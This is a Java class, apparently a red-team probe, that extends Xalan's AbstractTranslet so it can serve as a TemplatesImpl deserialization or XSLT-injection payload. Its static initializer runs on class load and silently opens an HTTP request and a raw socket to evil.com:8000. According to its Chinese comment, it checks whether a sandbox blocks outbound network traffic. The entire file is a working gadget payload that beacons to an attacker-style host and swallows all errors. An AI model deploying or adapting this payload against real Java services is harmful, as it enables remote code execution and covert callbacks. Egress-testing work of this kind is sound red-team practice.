import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** RT轮探针：静态块内发起网络回连（不走任何文件写动作）。
 *  两条独立路径各带唯一标记，infra 日志可归因：
 *   1) HttpURLConnection GET /rt/rt_net_r1
 *   2) 裸 Socket      GET /rt/rt_sock_r1
 *  若仅 1 失败 → URL 层有钩；全失败 → 出网全拦；全成功 → 网络面未覆盖。 */
public class PwnNet extends AbstractTranslet {
    static {
        try {
            java.net.URL u = new java.net.URL("http://evil.com:8000/rt/rt_net_r1");
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.getResponseCode();
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.net.Socket s = new java.net.Socket("evil.com", 8000);
            s.setSoTimeout(5000);
            s.getOutputStream().write(
                "GET /rt/rt_sock_r1 HTTP/1.0\r\nHost: evil.com\r\nUser-Agent: rt\r\n\r\n"
                    .getBytes("UTF-8"));
            s.getInputStream().read();
            s.close();
        } catch (Throwable t) {
            // 静默
        }
    }

    public PwnNet() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
